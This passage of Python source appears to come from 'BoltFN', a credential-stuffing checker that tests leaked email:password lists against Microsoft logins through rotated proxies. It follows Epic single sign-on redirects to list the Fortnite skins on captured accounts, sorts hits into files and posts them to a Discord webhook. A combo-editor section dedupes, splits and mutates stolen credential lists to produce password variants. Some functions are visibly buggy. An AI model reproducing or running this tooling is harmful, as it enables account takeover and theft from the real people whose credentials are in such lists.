                                            if total_gliders != None: message+=f"\nGliders: {total_gliders}"
                                            if total_pickaxes != None: message+=f"\nPickaxes: {total_pickaxes}"
                                            if total_backpacks != None: message+=f"\nBackBlings: {total_backpacks}"
                                            if total_skins != None: message+=f"\nSkins: {total_skins}"
                                            if exclusive: message+=f"\nExclusive Skins List: {exclusiveSkin}"
                                            if processed_skins != None: message+=f"\nSkins List: {processed_skins}"
                                            message = message+"\n============================\n"
                                            if exclusive == True:
                                                if not os.path.exists(self.folder + '/Fortnite/Exclusive'):
                                                    os.makedirs(self.folder + '/Fortnite/Exclusive')
                                                open(f'{self.folder}/Fortnite/Exclusive/{str(total_skins)} Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) == 0:
                                                open(f'{self.folder}/Fortnite/0 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 1 and int(total_skins) < 10:
                                                open(f'{self.folder}/Fortnite/1-9 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 10 and int(total_skins) < 50:
                                                open(f'{self.folder}/Fortnite/10-49 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 50 and int(total_skins) < 100:
                                                open(f'{self.folder}/Fortnite/50-99 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 100 and int(total_skins) < 200:
                                                open(f'{self.folder}/Fortnite/100-199 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 200 and int(total_skins) < 300:
                                                open(f'{self.folder}/Fortnite/200-299 Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            elif int(total_skins) >= 300:
                                                open(f'{self.folder}/Fortnite/300+ Skins.txt', 'a',
                                                encoding='u8').write(f'{message}\n')
                                            return
                                        except Exception as e:
                                            Counter.retries+=1
                                            continue

                                    except Exception as e:
                                        checked_num+=1
                                        Counter.retries+=1
                                        continue
                                else:
                                    checked_num +=1
                                    Counter.retries+=1
                                    Counter.retries+=1
                                    continue
                    else:
                        if result == 'Failure':
                            Counter.bad+=1
                            if Checker.printbadd:
                                if 'n' == self.cuimode:
                                    self.prints(f'{Fore.RED}[BAD] - {line}')
                                if Checker.save_bad:
                                    if not os.path.exists(self.folder + '/Bad'):
                                        os.makedirs(self.folder + '/Bad')
                                    open(f'{self.folder}/Bad/Invalid.txt', 'a',
                                        encoding='u8').write(f'{line}\n')
                        elif result == '2FACTOR':
                            Counter.custom+=1
                            if 'n' == self.cuimode:
                                    self.prints(f'{Fore.RED}[2FA] - {line}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/2fa.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                        elif result == 'Ban':
                            Counter.custom+=1
                            if 'n' == self.cuimode:
                                    self.prints(f'{Fore.RED}[2FA] - {line}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/Banned.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                        elif result == 'CUSTOM':
                            Counter.locked+=1
                            if 'n' == self.cuimode:
                                    self.prints(f'{Fore.RED}[LOCKED] - {line}')
                            if Checker.save_bad:
                                if not os.path.exists(self.folder + '/Bad'):
                                    os.makedirs(self.folder + '/Bad')
                                open(f'{self.folder}/Bad/Locked.txt', 'a',
                                encoding='u8').write(f'{line}\n')
                        elif result == 'Unknown':
                            self.usecheck(line)
                        return
                return
            else:
                Counter.bad+=1
                return
        except Exception as e:
            Counter.bad+=1
            return
    def follow_redirects(self, scraper, url, headers, cookies, retries, proxies, timeout):
        try:
            response = scraper.get(url, headers=headers, allow_redirects=False, cookies=cookies, proxies=self.proxies(), timeout=Checker.timeout)
            location = response.headers.get('location')

            return response, location
        except KeyError:
            return None, None
        except Exception as e:
            Counter.retries += 1
            return None, None

    def process_redirect_chain(self, scraper, initial_url, headers, cookies):
        url = initial_url
        while True:
            response, location = self.follow_redirects(scraper, url, headers, cookies)
            if not location:
                retries += 1
                continue

            if 'https://www.unrealengine.com:443/id/api/sso?sid=' in location:
                url = location
            elif 'https://www.twinmotion.com:443/id/api/sso?sid=' in location:
                url = location
            elif 'https://www.fortnite.com:443/id/api/sso?' in location:
                url = location
            else:
                retries += 1
                continue

            response, _ = self.follow_redirects(scraper, url, headers, response.cookies)
            if response and 'eg1~' in response.cookies.get('REFRESH_EPIC_EG1', ''):
                return response
            else:
                retries += 1
                continue
    def parse_1(self,text):
        dis_match = re.search(r'"lastName":"(.*?)","email":"(.*?)"', text)
        if dis_match:
            dis = dis_match.group(0)
        else:
             dis = None
        try:
            display_name_match = re.search(r'"displayName":"(.*?)"', dis)
            if display_name_match:
                display_name = display_name_match.group(1)
            else:
                display_name = None
            country_match = re.search(r'"country":"(.*?)"', dis)
            if country_match:
                country = country_match.group(1)
            else:
                country = None
            accid_match = re.search(r'"id":"(.*?)"', dis)
            if accid_match:
                accid = accid_match.group(1)
            else:
                accid = None
            email_verified_match = re.search(r'"emailVerified":(.*?)(,|\})', dis)
            if email_verified_match:
                email_verified_status = email_verified_match.group(1).strip()
            else:
                email_verified_status = None
        except:
            display_name = 'Error'
            country = 'Error'
            accid = 'Error'
            email_verified_status = 'Error'
        return display_name,country,accid,email_verified_status
    def parse_lr(self,text, start_delim, end_delim):
        pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
        match = re.search(pattern, text)
        return match.group(1) if match else None

    def parse_url(self,url):
        match = re.search(r"[&?]route=([^&]*)", url)
        return match.group(1) if match else None

    def parse_cookie(self,cookies, key):
        return cookies.get(key)
    def parse_source_for_url(self, source):
        match = re.search(r"urlPost:'(.*?)'", source)
        if match:
            url = match.group(1)
            return url
        return None
    def check_response(self,r):
        failure_keywords = [
            "Your account or password is incorrect.",
            "That Microsoft account doesn\\'t exist. Enter a different account",
            "Sign in to your Microsoft account"
        ]

        ban_keywords = [
                            ",AC:null,urlFedConvertRename"
                        ]


        two_factor_keywords = [
                            "account.live.com/recover?mkt",
                            "recover?mkt",
                            "account.live.com/identity/confirm?mkt",
                            "Email/Confirm?mkt"
                            "Help us protect your account"
                        ]

        custom_keywords = [
                            "/cancel?mkt=",
                            "/Abuse?mkt="
                        ]
        cookies = r.cookies.get_dict()
        if any(keyword in r.text for keyword in failure_keywords):
            return "Failure"
        if any(keyword in r.text for keyword in ban_keywords):
            return "Ban"
        if any(keyword in r.text for keyword in two_factor_keywords):
            return "2FACTOR"
        if any(keyword in r.text for keyword in custom_keywords):
            return "CUSTOM"
        if any(keyword in cookies for keyword in ["ANON", "WLSSC"]) or \
        any(keyword in r.url for keyword in ["https://login.live.com/oauth20_desktop.srf?"]) or \
        "sSigninName" in r.text:
            return "Success"

        return "Unknown"

    def urlscraper(self):
        urls = []
        proxies = []
        scrapedproxies = []
        tim = int(input('Timeout: '))
        urlss = open('urls.txt', 'r', encoding='u8',
                     errors='ignore').read().split('\n')
        improvedurls = [x for x in urlss if x != '' and 'http' in x]
        for line in improvedurls:
            urls.append(line)
        while True:
            currentnumber = open(
                'Scraped.txt', 'r', encoding='u8', errors='ignore').read().split('\n')
            beforescrape = (len(scrapedproxies))
            for url in urls:
                try:
                    r = requests.get(url, timeout=tim)
                except:
                    print(f'{Fore.RED}[-] Couldn\'t connect {url}')
                    urls.remove(url)
                    continue
            lol = r.text.split('\n')
            urls.remove(url)
            for line in lol:
                proxies.append(line)
                scrapedproxies = [x for x in proxies if x !=
                                  '' and ':' in x and 'a' not in x and 'b' not in x and 'c' not in x and 'd' not in x and 'e' not in x and 'f' not in x and 'g' not in x and 'h' not in x and 't' not in x]
                scraped = len(scrapedproxies) - beforescrape
            print(f'{Fore.GREEN}[+] Scraped {scraped} Proxies from {url}')
            for proxy in scrapedproxies:
                open(f'Scraped.txt', 'a', encoding='u8').write(f'{proxy}\n')
            if len(urls) > 0:
                continue
            else:
                print('Done scraping')
                break


    def title(self):
        while True:
                sleep(1)
                Total = len(self.accounts)
                Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked
                badd = Counter.bad / Total * 100
                chek = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked
                estimated = 0
                if Checked > 0:
                    estimated = Counter.hits/Checked * Total
                Counter.checkedpercent = round((chek / Total) * 100, 2)
                Counter.failedpercent = round(badd, 2)
                Counter.hitspercent = round((int(Counter.hits) / Total) * 100, 2)
                cust = Counter.custom + Counter.locked
                Counter.custompercent =round(number=(cust / Total * 100), ndigits=2)
                Counter.mshitspercent = round((int(Counter.mshit) / Total) * 100, 2)
                estimatedhits = round(estimated)
                Total = len(self.accounts)
                windll.kernel32.SetConsoleTitleW(
                    f"BoltFN | v{self.version}"
                    f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
                    f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
                    f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
                    f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
                    f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
                    f' | Retries: {Counter.retries}'
                    f' | CPM: {Counter.cpm}'
                    f' | Checking for: {self.Timeused()}')


    def proxies(self):
        if Checker.Proxy.proxy:
            proxy = choice(self.proxylist)
            if proxy.count(':') == 3:
                spl = proxy.split(':')
                proxy = f'{spl[2]}:{spl[3]}@{spl[0]}:{spl[1]}'
            else:
                proxy = proxy
            if self.proxy_type.lower() == 'http' or self.proxy_type.lower() == 'https':
                proxy_form = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
            else:
                proxy_form = {
                    'http': f"{self.proxy_type.lower()}://{proxy}",
                    'https': f"{self.proxy_type.lower()}://{proxy}"
                }
            return proxy_form
        else:
            return None




    def cpm_counter(self):
        while True:
            checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban + Counter.epic2fa
            sleep(0.5)
            awa = (Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked + Counter.fnban + Counter.epic2fa)-checked
            Counter.cpm = awa * 60

    def prints(self, line):
        lock.acquire()
        print(f'{line}')
        lock.release()

    def webhooksend(self, line):
        webhooksent = 0
        while True:
            webhook = DiscordWebhook(
                url=f'{Checker.webhook.webhookid}', content=f'{line}')
            response = webhook.execute()
            webhooksent += 1
            if webhooksent > 3:
                sleep(5)

    def Refreshconsole(self):
        while True:
            try:
                time.sleep(1)
                categories = {
                    "Exclusive": {"FA": 0, "NFA": 0},
                    "300+ Skins": {"FA": 0, "NFA": 0},
                    "200-299 Skins": {"FA": 0, "NFA": 0},
                    "100-199 Skins": {"FA": 0, "NFA": 0},
                    "50-99 Skins": {"FA": 0, "NFA": 0},
                    "10-49 Skins": {"FA": 0, "NFA": 0},
                    "1-9 Skins": {"FA": 0, "NFA": 0},
                    "0 Skins": {"FA": 0, "NFA": 0}
                }
                for data in Counter.skins_data:
                    fullAccess = data["fullAccess"]
                    total_skins = data["total_skins"]
                    exclusive = data['exclusive']
                    if exclusive:
                        categories["Exclusive"][fullAccess] += 1
                    elif 300 <= total_skins:
                        categories["300+ Skins"][fullAccess] += 1
                    elif 200 <= total_skins <= 299:
                        categories["200-299 Skins"][fullAccess] += 1
                    elif 100 <= total_skins <= 199:
                        categories["100-199 Skins"][fullAccess] += 1
                    elif 50 <= total_skins <= 99:
                        categories["50-99 Skins"][fullAccess] += 1
                    elif 10 <= total_skins <= 49:
                        categories["10-49 Skins"][fullAccess] += 1
                    elif 1 <= total_skins <= 9:
                        categories["1-9 Skins"][fullAccess] += 1
                    elif total_skins == 0:
                        categories["0 Skins"][fullAccess] += 1

                tree = categories
                total_hits = sum(counts["FA"] + counts["NFA"] for counts in tree.values())
                logo_colored = [
                    f"                {Fore.GREEN}██████{Fore.CYAN}╗{Fore.GREEN}  ██████{Fore.CYAN}╗{Fore.GREEN} ██{Fore.CYAN}╗{Fore.GREEN}  ████████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN} ██████{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}╗{Fore.GREEN}███████{Fore.CYAN}╗{Fore.GREEN}██████{Fore.CYAN}╗",
                    f"                {Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}╔═══{Fore.GREEN}██{Fore.CYAN}╗{Fore.GREEN}██{Fore.CYAN}║  ╚══{Fore.GREEN}██{Fore.CYAN}╔══╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}  ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN} ██{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}╔════╝{Fore.GREEN}██{Fore.CYAN}╔══{Fore.GREEN}██{Fore.CYAN}╗",
                    f"                {Fore.GREEN}██████{Fore.CYAN}╔╝{Fore.GREEN}██{Fore.CYAN}║{Fore.GREEN}   ██{Fore.CYAN}║{Fore.GREEN}██{Fore.CYAN}║    {Fore.GREEN} ██{Fore.CYAN}║  {Fore.GREEN} ██{Fore.CYAN}║{Fore.GREEN}     ███████{Fore.CYAN}║{Fore.GREEN}█████{Fore.CYAN}╗{Fore.GREEN}  ██{Fore.CYAN}║    {Fore.GREEN} █████{Fore.CYAN}╔╝{Fore.GREEN} █████{Fore.CYAN}╗  {Fore.GREEN}██████{Fore.CYAN}╔╝",
                    f"                {Fore.CYAN}██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN} ██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}║    {Fore.CYAN} ██{Fore.GREEN}║   {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}     ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}██{Fore.GREEN}╔══╝  {Fore.CYAN}██{Fore.GREEN}║     {Fore.CYAN}██{Fore.GREEN}╔═{Fore.CYAN}██{Fore.GREEN}╗{Fore.CYAN} ██{Fore.GREEN}╔══╝ {Fore.CYAN} ██{Fore.GREEN}╔══{Fore.CYAN}██{Fore.GREEN}╗",
                    f"                {Fore.CYAN}██████{Fore.GREEN}╔╝╚{Fore.CYAN}██████{Fore.GREEN}╔╝{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║   ╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║{Fore.CYAN}███████{Fore.GREEN}╗╚{Fore.CYAN}██████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║ {Fore.CYAN} ██{Fore.GREEN}╗{Fore.CYAN}███████{Fore.GREEN}╗{Fore.CYAN}██{Fore.GREEN}║  {Fore.CYAN}██{Fore.GREEN}║",
                    f"                {Fore.GREEN}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
                ]
                total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('═') + line.count('║') for line in logo_colored)
                chars_to_color = int(round(total_chars * Counter.checkedpercent / 100))

                colored_logo = ""
                colored_count = 0

                for line in logo_colored:
                    colored_line = ""
                    for char in line:
                        if char in '█╔╗═║╚' and colored_count < chars_to_color:
                            colored_line += char  
                            colored_count += 1
                        else:
                            if char in '█╔╗═║╚':
                                colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
                            else:
                                colored_line += char 
                    colored_logo += colored_line + "\n"

                system('cls')

                c = f"{colored_logo}"
                print(c)

                print(f'                                                {Fore.WHITE}[Progress: {Counter.checkedpercent:.2f}%{Fore.WHITE}]\n\n')
                print(f"{Fore.WHITE}[{Counter.bad + Counter.custom + Counter.locked}] {Fore.RED}Bad")
                print(f" {Fore.WHITE}├── [{Counter.bad}] {Fore.YELLOW}Invalid")
                print(f" {Fore.WHITE}├── [{Counter.locked}] {Fore.YELLOW}Locked")
                print(f" {Fore.WHITE}└── [{Counter.custom}] {Fore.YELLOW}2FA")
                print(f"{Fore.WHITE}[{Counter.mshit}] {Fore.GREEN}MS-Hit")
                print(f" {Fore.WHITE}├── [{Counter.mshit - Counter.fnban - Counter.epic2fa - Counter.xb}] {Fore.YELLOW}Not linked")
                print(f" {Fore.WHITE}├── [{Counter.epic2fa}] {Fore.YELLOW}2FA")
                print(f" {Fore.WHITE}├── [{Counter.xb}] {Fore.YELLOW}Xbox")
                print(f" {Fore.WHITE}└── [{Counter.fnban}] {Fore.YELLOW}Banned")
                print(f"{Fore.WHITE}[{total_hits}] {Fore.GREEN}Hit")
                category_list = list(tree.items())  
                last_category_idx = len(category_list) - 1
                for idx, (category, counts) in enumerate(category_list):
                    fa_count = counts['FA']
                    nfa_count = counts['NFA']
                    total_count = fa_count + nfa_count

                    is_last_category = idx == last_category_idx
                    if is_last_category:
                        print(f"{Fore.WHITE} └── [{total_count}] {Fore.CYAN}{category}")
                    else:
                        print(f"{Fore.WHITE} ├── [{total_count}] {Fore.CYAN}{category}")

                    fa_vertical = Fore.WHITE + " │" if not is_last_category else Fore.WHITE + "  "
                    nfa_vertical = Fore.WHITE + "  " if fa_count > 0 and is_last_category else fa_vertical

                    if fa_count > 0:
                        print(f"{fa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{fa_count}] {Fore.GREEN}FA")

                    if nfa_count > 0:
                        print(f"{nfa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{nfa_count}] {Fore.GREEN}NFA")

            except Exception as e:
                print(f"{Fore.RED}{e}")
    def Timeused(self):
        from time import time
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))

    def get_option(self, option):
        options = {
            1: self.password1,
            2: self.generaledits,
            3: self.domain_sorter,
            4: self.domain_adder,
            5: self.domain,
            6: self.split,
            8: self.names,
            9: self.emails,
            10: self.combo,
            11: self.sort,
            12: self.filter,
            13: self.domainchanger


        }
        options[int(option)]()
    

    def filter(self):
        system('cls')
        print(self.t)
        output_file: str = f'Results/Filtered{self.unix}.txt'
        print(f'{Fore.CYAN}\n[ComboEditor] Removing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'{output_file}', 'a', encoding='utf8') as out_file:
            for line in in_file:
                if line.count(':') == 1:
                    if '@' in line.split(':')[0]:
                        if '.' in line:
                                out_file.write(line)
                                counter.goodlines += 1
                        else:
                            counter.badlines += 1
                    else:
                        counter.badlines += 1
                else:
                    counter.badlines += 1
            afterremove = open(output_file, 'r', encoding='u8',
                               errors='ignore').read().split('\n')
            beforeremove = open(self.file, 'r', encoding='u8',
                                errors='ignore').read().split('\n')
            print(
                f'{Fore.CYAN}[ComboEditor] Removed Badlines, Saved in {output_file}')
            print(
                f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
            input(
                f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
            system('cls')
            Main()

    def sort(self):
        output_file: str = f'Duplicate_Removed{self.unix}.txt'
        open(output_file, 'w', encoding='latin-1').writelines(
            set(self.lines.readlines()))
        print(
            f'{Fore.CYAN}\n[ComboEditor] Removed Duplicates, Saved in {output_file}')
        afterremove = open(output_file, 'r', encoding='u8',
                           errors='ignore').read().split('\n')
        beforeremove = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
        print(
            f'{Fore.CYAN}[ComboEditor] Before: {len(beforeremove)} After: {len(afterremove)}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()
    def domainchanger(self):
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/domain added{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                if ':' in line:
                    email,passw = line.split(':')
                    if '@' in email and '.' in email:
                        username = email.split('@')[0]
                        line = f'{username}@hotmail.com:{passw}'
                        out_file.write(line)
    def domain_adder(self):
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/domain added{self.created}.txt', 'a') as out_file:
            for line in in_file:
                top = line.split(':')[0]
                end = line.split(':')[-1]
                if top.__contains__("@"):
                    break
                else:
                    for domain in self.domain_list:
                        added = f"{top}{domain}:{end}"
                        out_file.write(added)

    def split(self):
        print('')
        chunks = int(
            input(f'{Fore.CYAN}[ComboEditor] Amount of lines in each file:\n> '))
        name = input(f'{Fore.CYAN}\n[ComboEditor] Name of splitted files:\n> ')
        sorting = True
        hold_lines = []
        for row in self.lines:
            hold_lines.append(row)
        outer_count = 1
        line_count: int = 0
        while sorting:
            num = str(outer_count)
            count = 0
            increment = (outer_count - 1) * chunks
            left = len(hold_lines) - increment
            file_name = f'{str(num)}-{name}.txt'
            hold_new_lines = []
            if left < chunks:
                while count < left:
                    hold_new_lines.append(hold_lines[line_count])
                    count += 1
                    line_count += 1
                sorting = False
            else:
                while count < chunks:
                    hold_new_lines.append(hold_lines[line_count])
                    count += 1
                    line_count += 1
                outer_count += 1
                with open(file_name, 'w', encoding='latin-1') as next_file:
                    for row in hold_new_lines:
                        next_file.write(row)
        print(
            f'{Fore.CYAN}\n[ComboEditor] Done Splitting \n Splitted into {str(outer_count - 1)} files\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def get(self):
        system('cls')
        print(f'{Fore.CYAN}\n[ComboEditor] Merging\n')
        read_files = glob(f'{self.folder}/*.txt')
        for f in read_files:
            with open(f, 'r', encoding='latin-1') as outfile:
                self.infile.write(outfile.read())
        print(
            f'{Fore.CYAN}\n[ComboEditor] All text files in {self.folder} were merged and saved in {self.result}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def emails(self):
        system('cls')
        print(f'{Fore.CYAN}\n[ComboEditor] Extracting\n')
        name = f'Emails{self.unix}.txt'
        out = open(name, 'w', encoding='latin-1')
        for array_item in self.lines.readlines():
            match_list2 = findall(rf'{self.email}', array_item)
            if len(match_list2) > 0:
                out.write(f'{match_list2[0]}\n')
        print(
            f'{Fore.CYAN}\n[ComboEditor] Done extracting emails.{self.extracted} emails in {name}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def names(self):
        system('cls')
        print(f'{Fore.CYAN}\n[ComboEditor] Extracting\n')
        name = f'Usernames{self.unix}.txt'
        out = open(name, 'w', encoding='latin-1')
        for array_item in self.lines.readlines():
            match_list1 = findall(r'[\w.*]+', array_item)
            if len(match_list1) > 0:
                out.write(f'{match_list1[0]}')
        print(
            f'{Fore.CYAN}\n[ComboEditor] Done extracting usernames.{self.extracted} usernames in {name}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()
    def combo(self):
        system('cls')
        print(f'{Fore.CYAN}\n[ComboEditor] Extracting\n')
        name = f'Combos{self.unix}.txt'
        out = open(name, 'w', encoding='latin-1')
        for ArrayItem in self.lines.readlines():
            match_list = findall(
                rf'{self.email}:[\w!@#$%^&*()''"-{}?;~:]+', ArrayItem)
            if len(match_list) > 0:
                out.write(f'{match_list[0]}\n')
        print(
            f'{Fore.CYAN}\n[ComboEditor] Done extracting combos.{self.extracted} combos in {name}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def splitter(self):
        system('cls')
        sep = input("Input delimiter (Default is ':')\n> ")
        if sep == '':
            delimiter = ':'
        else:
            delimiter = sep
        usernames = f'User{self.unix}.txt'
        pwd = f'Pass{self.unix}.txt'
        u = open(usernames, 'w', encoding='latin-1')
        p = open(pwd, 'w', encoding='latin-1')
        lines = self.lines.readlines()
        for x in range(len(lines)):
            user, pw = lines[x].split(delimiter)
            u.write(f'{user}\n')
            p.write(pw)
        print(
            f'{Fore.CYAN}\n[ComboEditor] Users saved in {usernames}\nPasswords saved in {pwd}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def domain(self):
        name = f'RemovedDomains{self.unix}.txt'
        out = open(name, 'w')
        for ArrayItem in self.lines.readlines():
            match = findall(r'@[\w.]+', ArrayItem)
            if len(match) > 0:
                remove = ArrayItem.replace(match[0], '')
                out.write(remove)
        print(
            f'{Fore.CYAN}\n[ComboEditor] Successfully removed all domains.\nUser saved in {name}\n')
        input(f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
        system('cls')
        Main()

    def domain_sorter(self):
        system('cls')
        print(f'{Fore.CYAN}[ComboEditor] Sorting Domains to Results/Domains')
        reg = compilee(r'(\.\w+):')
        if not path.exists("Results/Domains"):
            mkdir("Results/Domains")
        with open(self.file, 'r', encoding='utf8') as in_file:
            for line in in_file:
                if '@' in line:
                    rep = reg.search(line)
                    rep = rep.group().replace(':', '')
                    rep = rep.replace('\n', '')
                    with open(f'Results/Domains/{rep}{self.created}.txt', 'a') as file:
                        file.write(line)

                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)

                    w = line.replace('\n', '')
                    print(Fore.RED + f"Invalid line")
            print(f'{Fore.CYAN}[ComboEditor] Done Sorting')
            input(
                f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
            system('cls')
            Main()

    def email_domain(self):
        reg = compilee(r'@[\w.]+')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MailDomain{self.created}.txt', 'a') as out_file:
            for line in in_file:
                if '@' in line:
                    domain = choice(self.domain_list)
                    rep = reg.sub(domain, line)
                    rep = rep.replace('\n', '')
                    print(Fore.LIGHTGREEN_EX + f'{line} Replace with {rep}')
                    out_file.write(rep + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                    w = line.replace('\n', '')
                    print(Fore.RED + f"{w} Invalid Line")
            input(
                f'{Fore.LIGHTCYAN_EX}[Menu] Press ENTER to get back to the menu')
            system('cls')
            Main()

    def generaledits(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/General{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '?'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general2()

    def general2(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/General{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '#'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general3()

    def general3(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
        with open(self.file, 'r', encoding='utf8') as in_file, \
                open(f'Results/MinecraftEdits{self.created}.txt', 'a', encoding='utf8') as out_file:
            for line in in_file:
                pw1 = '69'
                v = 1
                spilited = line.split(':')
                if ':' in line:
                    if v == 1:
                        t = spilited[1] + str(pw1)
                    else:
                        t = spilited[1] + str(pw1)
                    t = t.replace('\n', '')
                    email = spilited[1].replace('\n', '')
                    out_file.write(spilited[0] + ':' + t + '\n')
                else:
                    with open(f'Results/Invalid{self.created}.txt', 'a') as invalid:
                        invalid.write(line)
                        w = line.replace('\n', '')
            unedited = open(self.file, 'r', encoding='u8',
                            errors='ignore').read().split('\n')
            edited = open(f'Results/General{self.created}.txt', 'r',
                          encoding='u8', errors='ignore').read().split('\n')
            print(f'{Fore.CYAN}[ComboEditor] Editing\n')
            self.general4()

    def general4(self):
        system('cls')
        print(self.t)
        print(f'{Fore.CYAN}[ComboEditor] Editing...')
